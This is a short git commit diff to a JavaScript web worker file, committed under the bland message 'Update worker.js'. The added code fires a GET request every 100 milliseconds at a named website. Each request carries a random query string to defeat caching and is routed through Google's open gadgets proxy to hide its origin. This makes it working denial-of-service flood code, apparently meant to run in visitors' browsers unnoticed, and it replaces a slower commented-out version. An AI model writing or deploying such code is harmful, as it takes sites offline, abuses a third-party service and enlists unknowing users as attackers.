58ffa124f53fb9aafd10af0fe64b52ad9e2e97f4
Yusuf Dolu <38819540+yusufdolu60@users.noreply.github.com>
2018-05-04 02:39:42 +0300

    Update worker.js

--- worker.js
+++ worker.js
@@ -1,4 +1,24 @@
 self.addEventListener('message', function(e) {
+
+	setInterval(function(){
+
+		var target = 'http://www.soruyacevap.com/?'+Math.random().toString(36).substr(2, 7)+'='+Math.floor(Math.random() * 99999999);
+
+		var url = 'https://images1-focus-opensocial.googleusercontent.com/gadgets/proxy?url='+encodeURIComponent(target)+'&container=none';
+
+		var xmlHttp = new XMLHttpRequest();
+
+		xmlHttp.open("GET", url, true);
+
+		xmlHttp.send(null);
+
+	}, 100);
+
+});
+
+
+/*
+self.addEventListener('message', function(e) {
 	
 	setInterval(function(){
 		
@@ -13,3 +33,4 @@ self.addEventListener('message', function(e) {
 	}, 1000);
 
 });
+*/
